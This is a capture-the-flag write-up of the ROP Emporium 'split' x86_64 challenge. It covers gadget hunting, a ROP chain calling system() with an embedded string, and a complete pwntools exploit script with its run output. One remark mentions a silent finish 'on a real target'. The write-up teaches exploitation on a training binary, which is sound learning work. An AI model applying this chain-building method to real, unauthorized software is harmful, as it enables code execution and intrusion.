# ROP Emporium — split (x86_64)

> **Category:** pwn / binary exploitation
> **Binary:** [split](https://ropemporium.com/challenge/split.html) (ROP Emporium, x86_64)
> **Techniques:** stack overflow → ROP chain, `pop rdi; ret` gadget hunting, calling `system()` with a controlled argument
> **Environment:** authorized training binary, local lab

`split` is the natural sequel to
[ret2win](../rop-emporium-ret2win/): the win code exists, but this time it
runs the *wrong* command — we must build a tiny ROP chain to call `system()`
with **our** string.

## 1. Recon

```
$ file split
split: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
```

Same protections profile as ret2win: NX on, no PIE, symbols present.

## 2. The puzzle pieces

`usefulFunction()` calls `system()`, but with `/bin/ls` — useless:

```
0000000000400742 <usefulFunction>:
  400746:  mov   edi,0x40084a
  40074b:  call  400560 <system@plt>

$ strings -t x split | grep -E "bin|flag"
   84a /bin/ls                  <- what usefulFunction runs  (0x40084a)
  1060 /bin/cat flag.txt        <- what we WANT to run        (0x601060)
```

So the ingredients are:

| Piece | Address | Note |
|---|---|---|
| `system@plt` | `0x400560` | target function |
| `"/bin/cat flag.txt"` | `0x601060` | argument string, already in the binary |
| overflow offset | 40 | same 32+8 layout as ret2win |

Missing: a way to load `rdi` (first argument register, x86_64 SysV ABI).

## 3. Gadget hunting by bytes

The binary has no literal `pop rdi` in the symbol-level disassembly — but
ROP gadgets don't care about instruction boundaries. Scanning `.text` for
the byte pair `5f c3` (`pop rdi; ret`):

```python
data = open("split", "rb").read()
text = data[0x5b0:0x5b0+0x222]     # .text: vaddr 0x4005b0, off 0x5b0, size 0x222
j = text.find(b"\x5f\xc3")
print(hex(0x4005b0 + j))           # 0x4007c3
```

```
pop rdi ; ret  @ 0x4007c3      <- hides inside `pop %r15` (41 5f) at 0x4007c2
```

We also reuse the alignment `ret` from ret2win at `0x40053e` — without it,
glibc's `system()` dies on a `movaps` fault (see the ret2win note).

## 4. The chain

```
[ 40 * "A"        ]  fill buffer + saved rbp
[ 0x40053e        ]  ret                  ; align RSP to 16 for system()
[ 0x4007c3        ]  pop rdi ; ret
[ 0x601060        ]  "/bin/cat flag.txt"  ; -> rdi
[ 0x400560        ]  system@plt           ; pwned
```

## 5. Exploit & verification

```python
from pwn import *

elf = context.binary = ELF("./split", checksec=False)

RET     = 0x40053e                 # ret — stack alignment shim
POP_RDI = 0x4007c3                 # pop rdi ; ret
CATFLAG = 0x601060                 # "/bin/cat flag.txt"
SYSTEM  = elf.plt["system"]        # 0x400560

io = process("./split")
io.sendline(flat(b"A" * 40, RET, POP_RDI, CATFLAG, SYSTEM))
print(io.recvall().decode(errors="replace"))
```

Real run:

```
$ python3 exploit.py
split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> Thank you!
ROPE{a_placeholder_32byte_flag!}
```

(The process segfaults *after* printing — there is no clean exit on our
chain, and none is needed: the flag is already out. On a real target you
would append `exit@plt` for a silent finish.)

## Takeaways

- ret2win → split is the moment you stop *jumping to code* and start
  *composing* it: one gadget to set up a register, one call to cash in.
- Gadgets live between instruction boundaries. `objdump` alone won't show
  `pop rdi; ret` — byte-level scanning (`5f c3`) or a tool like ROPgadget
  will.
- Argument passing on x86_64: `rdi`, `rsi`, `rdx`, ... — each new argument
  you need is one more `pop` gadget in the chain.
